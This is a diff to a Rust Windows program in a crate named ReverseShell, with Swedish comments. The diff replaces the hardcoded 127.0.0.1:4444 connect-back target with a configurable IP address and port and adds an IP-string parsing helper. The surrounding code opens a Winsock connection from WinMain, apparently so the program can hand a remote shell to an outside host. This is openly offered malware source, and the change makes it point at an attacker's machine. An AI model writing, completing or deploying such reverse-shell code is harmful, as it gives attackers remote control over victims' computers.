@@ -4,6 +4,7 @@
 
 use core::ffi::c_void;
 use core::panic::PanicInfo;
+use ReverseShell::settings::{IP_ADDRESS, PORT};
 
 #[link(name = "ws2_32")]
 unsafe extern "system" {
@@ -51,8 +52,8 @@ pub extern "system" fn WinMain(
         // Anslut till 127.0.0.1:4444
         let mut addr = SOCKADDR_IN {
             sin_family: 2, // AF_INET
-            sin_port: (4444u16.to_be()), // 4444 i network byte order (big-endian)
-            sin_addr: u32::from_ne_bytes([127, 0, 0, 1]), // 127.0.0.1 i little-endian (Winsock-kompatibelt)
+            sin_port: (PORT.to_be()), //  (big-endian)
+            sin_addr: ip_str_to_u32(IP_ADDRESS), // little-endian WinSock
             sin_zero: [0; 8],
         };
         if connect(sock, &addr, core::mem::size_of::<SOCKADDR_IN>() as i32) != 0 {
@@ -85,7 +86,25 @@ pub extern "system" fn WinMain(
     0
 }
 
-#[panic_handler]
-fn panic(_info: &PanicInfo) -> ! {
-    loop {}
+/* Helpers  */
+fn ip_str_to_u32(ip: &str) -> u32 {
+    let mut octets = [0u8; 4];
+    let mut parts = ip.as_bytes().split(|&b| b == b'.');
+
+    for i in 0..4 {
+        if let Some(part) = parts.next() {
+            let mut num = 0u8;
+            for &b in part {
+                if b < b'0' || b > b'9' {
+                    return 0; // Ogiltig IP, returnera 0.0.0.0
+                }
+                num = num * 10 + (b - b'0');
+            }
+            octets[i] = num;
+        }
+    }
+
+    u32::from_ne_bytes(octets)
 }
+
+
